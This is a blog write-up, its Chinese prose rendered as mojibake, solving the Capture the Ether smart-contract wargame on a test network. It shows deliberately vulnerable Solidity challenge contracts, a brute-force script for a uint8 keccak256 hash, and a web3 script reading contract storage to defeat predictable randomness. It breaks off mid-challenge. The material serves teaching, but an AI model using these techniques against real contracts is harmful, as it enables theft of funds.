    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Capture the ether æ˜¯ä¸€ä¸ªé€‚åˆç”¨æ¥å…¥é—¨åˆçº¦çš„ wargame å¹³å°ã€‚æˆ‘æœ€è¿‘ä¸€ç›´åˆ°äº”ä¸€èŠ±äº†ç‚¹æ—¶é—´åšäº†ä¸‹ä¸€ä¸‹ã€‚ å¦å¤–è¿™é‡Œæ„Ÿè°¢ @0x9k @pikachu @xhyumiracle @iczc ç»™æˆ‘æä¾›çš„å¸®åŠ©ã€‚</p><h2 id="å¹³å°åœ°å€"><a href="#å¹³å°åœ°å€" class="headerlink" title="å¹³å°åœ°å€"></a>å¹³å°åœ°å€</h2><p><a href="https://capturetheether.com/challenges/">Capture the Ether - Challenges</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="1-Deploy-a-contract"><a href="#1-Deploy-a-contract" class="headerlink" title="1. Deploy a contract"></a>1. Deploy a contract</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, you need to:</p><ol><li>InstallÂ <a href="https://metamask.io/">MetaMask</a>.</li><li>Switch to theÂ <strong>Ropsten test network</strong>.</li><li>Get some Ropsten ether. Clicking the â€œbuyâ€ button in MetaMask will take you to aÂ <em>faucet</em>Â that gives out free test ether.</li></ol><p>After youâ€™ve done that, press the red button on the left to deploy the challenge contract.</p><p>You donâ€™t need to do anything with the contract once itâ€™s deployed. Just click the â€œCheck Solutionâ€ button to verify that you deployed successfully.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜</strong></p><p>å®‰è£…å®Œ <code>MetaMask</code> åï¼Œ å¼€å¯æµ‹è¯•ç½‘ç»œã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png"></a></p><p>è·å–ä»£å¸ï¼š é€šå¸¸ <code>MetaMask</code> åˆ‡æ¢åˆ° Ropsten æµ‹è¯•ç½‘ç»œåï¼Œ ç‚¹å‡»è´­ä¹°ï¼Œ å¯ä»¥çœ‹åˆ°ä¸€ä¸ª <code>æµ‹è¯•æ°´ç®¡</code> ï¼Œå¯ä»¥ä»ä¸€ä¸ªæ°´é¾™å¤´è·å–ä»£å¸</p><p>æ°´é¾™å¤´ï¼š <a href="https://faucet.metamask.io/">https://faucet.metamask.io/</a> </p><p>ä½†æ˜¯è¿™ä¸ªæ°´é¾™å¤´æˆ‘è·å–ä¸åˆ°ä»£å¸ï¼Œæœ€åç”¨äº† @iczc çš„æ°´é¾™å¤´è·å–çš„ï¼š <a href="https://faucet.chainflag.org/">ETH Testnet Faucet (chainflag.org)</a></p><h3 id="2-callme"><a href="#2-callme" class="headerlink" title="2. callme"></a>2. callme</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>To complete this challenge, all you need to do is call a function.</p><p>The â€œBegin Challengeâ€ button will deploy the following contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call the function namedÂ <code>callme</code>Â and then click the â€œCheck Solutionâ€ button.</p><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=7ou6MoKmxFQ">Call On Me</a>.</p><p><strong>è§£é¢˜</strong></p><p>é¢˜ç›®è¦è®©æˆ‘ä»¬éƒ¨ç½²åˆçº¦åï¼Œè°ƒç”¨ <code>callme</code> è¿™ä¸ªå‡½æ•°ï¼Œæ„æ€è®©æˆ‘ä»¬å°è¯•ä¸éƒ¨ç½²åçš„åˆçº¦è¿›è¡Œäº¤äº’ã€‚</p><ol><li>éƒ¨ç½²é¢˜ç›®åˆçº¦ï¼Œ å¾—åˆ°ä¸€ä¸ª challenge åœ°å€</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png"></a><br>2. å®‰è£… remix-ide ç¼–è¾‘å™¨ï¼Œæˆ–è€…ä½¿ç”¨åœ¨çº¿çš„ï¼š <a href="https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">Remix - Ethereum IDE</a></p><p>éƒ¨ç½²é¢˜ç›®åˆçº¦ç”¨æ¥äº¤äº’è°ƒç”¨ challenge çš„ callme å‡½æ•°</p><p>éƒ¨ç½²æ–¹æ³•å¦‚ä¸‹</p><ul><li><p>åœ¨æ–‡ä»¶ç¼–è¾‘å™¨ä¸­ï¼Œ contracts æ–‡ä»¶ä¸­æ–°å»º <code>callme.sol</code>ï¼Œ å†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è½¬åˆ°ç¼–è¯‘ç•Œé¢ï¼Œè®¾ç½®ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Œç„¶åé€‰æ‹©ä¸‹æ–¹çš„ç¼–è¯‘</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png"></a></p><ul><li>è½¬åˆ°éƒ¨ç½²ç•Œé¢</li></ul><p>é€‰æ‹© <code>injected web3</code> , ç‚¹å‡»éƒ¨ç½²ï¼Œ å¡«å…¥ <code>At address</code> , ç„¶åå°±èƒ½è°ƒç”¨å¯¹åº”å…¬å¼€æ–¹æ³•</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png"></a></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œè°ƒç”¨ callme çš„æ—¶å€™è®°å¾—çœ‹æ¸…æ¥šè°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œ åƒå›¾ä¸­è¿™ä¸ªåœ°æ–¹å…¶å®è°ƒç”¨çš„æ–¹æ³•ä¸å¯¹ã€‚åº”è¯¥åœ¨ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªcallme</p><h3 id="3-Choose-a-nickname"><a href="#3-Choose-a-nickname" class="headerlink" title="3. Choose a nickname"></a>3. Choose a nickname</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>WARMUP: 200 POINTS</p><p><a href="https://capturetheether.com/challenges/warmup/nickname/#">Begin Challenge</a></p><p>Itâ€™s time to set your Capture the Ether nickname! This nickname is how youâ€™ll show up on theÂ <a href="https://capturetheether.com/leaderboard/">leaderboard</a>.</p><p>TheÂ <code>CaptureTheEther</code>Â smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the addressÂ <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p><p>Hereâ€™s the code for this challenge:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address &#x3D;&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] &#x3D; nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Challenge contract. You don&#39;t need to do anything with this; it just verifies</span><br><span class="line">&#x2F;&#x2F; that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte &#x3D; CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0">Say My Name</a>.</p><p><strong>è§£é¢˜</strong></p><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬è®¾ç½®æˆ‘ä»¬çš„ <code>nickname</code>, è°ƒç”¨ <code>setNickName</code> æ–¹æ³•å³å¯ï¼Œ ä½†æ˜¯è¿™é‡Œå‡½æ•°ä¼ å…¥çš„ç±»å‹ä¸º <code>bytes32</code> , æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„æˆ‘ä»¬çš„ nickname è½¬ä¸º <code>bytes32</code> ï¼Œ æˆ‘è¿™é‡Œä½¿ç”¨åœ¨çº¿çš„ç½‘ç«™è¿›è¡Œè½¬æ¢</p><p><a href="https://www.testcoins.io/str-bytes32">String To Bytes32 Online Converter (testcoins.io)</a></p><p>è½¬å®Œä¹‹åï¼Œ åœ¨ remix-ide ä¸­è°ƒç”¨ <code>setNickName</code> æ–¹æ³•</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png"></a></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="1-Guesst-the-number"><a href="#1-Guesst-the-number" class="headerlink" title="1. Guesst the number"></a>1. Guesst the number</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>Iâ€™m thinking of a number. All you have to do is guess it.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer &#x3D; 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M">Guessing Games</a>.</p><p><strong>è§£é¢˜</strong></p><p>è®©æˆ‘çŒœ <code>answer</code> çš„å€¼æ˜¯å¤šå°‘ï¼Œ å¦‚æœçŒœå¯¹åˆ™ <code>tansfer</code> , ä»£ç é‡Œçš„ <code>answer</code> æ˜¯å†™æ­»çš„ 42 ï¼Œé‚£ä¹ˆçŒœ 42 å³å¯ ã€‚ç„¶åä»£ç ä¸­è¦æ±‚ <code>msg.value</code>  è¦æ±‚è¦ä¸€ä¸ª <code>1 ether</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png"></a></p><h3 id="2-Guess-the-secret-number"><a href="#2-Guess-the-secret-number" class="headerlink" title="2.  Guess the secret number"></a>2.  Guess the secret number</h3><p><strong>é¢˜ç›®æè¿°</strong>ï¼š</p><p>Putting the answer in the code makes things a little too easy.</p><p>This time Iâ€™ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8">Mr. Roboto</a>.</p><p><strong>è§£é¢˜</strong></p><p>è¦æ±‚ <code>keccak256(n) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code>, n ä¸ºç”¨æˆ·è¾“å…¥ï¼Œä¸” <code>msg.value == 1 ether</code></p><p>n çš„å€¼ä¸º uint 8 , åˆ™èŒƒå›´ä¸º 0 - 256ï¼Œ å†™ä¸€ä¸ªè„šæœ¬çˆ†ç ´ä¸‹ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> Web3.keccak(i).hex() == <span class="string">&#x27;0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>        print(i)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="number">170</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>solidity è„šæœ¬å‚è€ƒ @0x9k PDF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function guess() public returns(uint8) &#123;</span><br><span class="line">        for (uint8 n &#x3D; 0; n&lt; 255; n++)</span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line"></span><br><span class="line">return n; &#125;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png"></a></p><blockquote><p>PSï¼š  é‡åˆ°äº†ä¸€ä¸ª Python3 Cryptodome åº“çš„ keccak256 å’Œ solidity è·‘å‡ºæ¥ç»“æœä¸ä¸€è‡´çš„é—®é¢˜<br><a href="https://ethereum.stackexchange.com/questions/30931/python-and-solidity-keccak256-function-gives-different-results">Python and Solidity keccak256 function gives different results </a></p></blockquote><p><strong>å‚è€ƒæ–‡æ¡£</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.main.html">Web3 API â€” Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a></p><h3 id="3-Guess-the-random-number"><a href="#3-Guess-the-random-number" class="headerlink" title="3.   Guess the random number"></a>3.   Guess the random number</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This time the number is generated based on a couple fairly random sources.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs">The Random Song</a>.</p><p><strong>è§£é¢˜</strong></p><p>è¯¥é¢˜ä¸ä¸Šä¸€ä¸ªé¢˜çš„åŒºåˆ«æ˜¯ï¼Œ è¿™ä¸ªé¢˜ç›®çš„ answer ç”± <code>uint8(keccak256(block.blockhash(block.number - 1), now));</code> è®¡ç®—è€Œå¾—ã€‚æœäº†ä¸‹ç›¸å…³ api ï¼Œ è¿™ä¸ªä»£ç ç‰ˆæœ¬ä¸º 0.4.21 ï¼š</p><ul><li><code>block.blockhash()</code>Â is nowÂ <code>blockhash()</code>Â hash of the given block whenÂ <code>blocknumber</code>Â is one of the 256 most recent blocks; otherwise returns zero</li><li><code>now</code>Â isÂ <code>block.timestamp</code> : current block number</li><li><code>block.number</code>Â (<code>uint</code>): current block number</li></ul><p>ç”±äºåˆçº¦çš„å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨åˆçº¦å¯¹åº”çš„ <code>stroge</code> é‡Œæ‰¾åˆ° numberã€‚ è¿™é‡Œæœ‰å‡ ç§æ–¹æ¡ˆ</p><ol><li>ç”¨ solidity å†™ä¸€ä¸ªäº¤äº’ä»£ç </li><li>ç”¨ Python çš„ web3 å†™ä¸€ä¸ªè„šæœ¬</li></ol><p>æˆ‘è¿™é‡Œä½¿ç”¨ web3 å†™ä¸€ä¸ªäº¤äº’è„šæœ¬ï¼Œç”±äºweb3.py å› ä¸ºè‡ªèº«ä¸ä¼šä½œä¸ºä¸€ä¸ªåŒºå—é“¾çš„èŠ‚ç‚¹å­˜åœ¨ï¼Œå› æ­¤å®ƒéœ€è¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹ç”¨æ¥å­˜å–åŒºå—é“¾ä¸Šçš„èµ„æ–™ã€‚ä¸€èˆ¬æ¥è¯´æœ€å®‰å…¨çš„æ–¹å¼åº”è¯¥æ˜¯è‡ªå·±ä½¿ç”¨ geth æˆ–è€… parity æ¥è‡ªå»ºèŠ‚ç‚¹ï¼Œä¸è¿‡å¦‚æœåœ¨ä¸æƒ³è¦è‡ªå»ºèŠ‚ç‚¹çš„çŠ¶å†µæ—¶ï¼Œå¯ä»¥è€ƒè™‘çœ‹çœ‹ infura æä¾›çš„ HTTP èŠ‚ç‚¹æœåŠ¡ã€‚</p><p>æˆ‘è¿™é‡Œåˆ° <a href="https://infura.io/dashboard/ethereum/d9f539bb96ba42c083d610b61d9be812/settings">Infura</a> æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œ ç„¶åè·å–å¯¹åº”çš„ API Key</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">infura_url = <span class="string">&#x27;https://mainnet.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url)) </span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;XXXX&#x27;</span> <span class="comment"># blockchain address ï¼Œ é¢˜ç›®éƒ¨ç½²åçš„åœ°å€</span></span><br><span class="line">a = web3.eth.getStorageAt(address, <span class="number">1</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒèµ„æ–™</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getStorageAt#web3.eth.Eth.getStorageAt">web3.eth API â€” Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a><br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347">Capture Ether: Guess the Random Number on a Smart Contract | by TomÃ¡s | Better Programming</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-i-4e0b40687efd">Letâ€™s Play â€” Capture the Ether : Lotteries (Part I) | by Forest Fang | Medium</a><br><a href="https://developer.51cto.com/article/706745.html">é€šè¿‡ web3.py ç”¨ Python å­˜å– Ethereum-51CTO.COM</a></p><h3 id="4-Guess-the-new-number"><a href="#4-Guess-the-new-number" class="headerlink" title="4. Guess the new number"></a>4. Guess the new number</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>The number is now generated on-demand when a guess is made.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc">I Guess Itâ€™s Christmas Time</a>.</p><p><strong>é¢˜è§£ï¼š</strong></p><p>è¿™ä¸ªé¢˜ç›®çš„éšæœºæ•°æ˜¯åœ¨ guess å‡½æ•°è°ƒç”¨çš„æ—¶å€™ç”Ÿæˆçš„ã€‚ å³é¢˜ç›®æè¿°ä¸­ çš„ <em>generated on-demand when a guess is made</em> , å› æ­¤æˆ‘ä»¬æ²¡æ³•ç›´æ¥è·å–æ”¹éšæœºå€¼ã€‚ä»”ç»†é˜…è¯»ä»£ç æˆ‘ä»¬å‘ç°ï¼Œ <code>answer</code> ç”±ä»£ç  <code>uint8(keccak256( block.blockhash(block.number - 1), now));</code> ç”Ÿæˆ 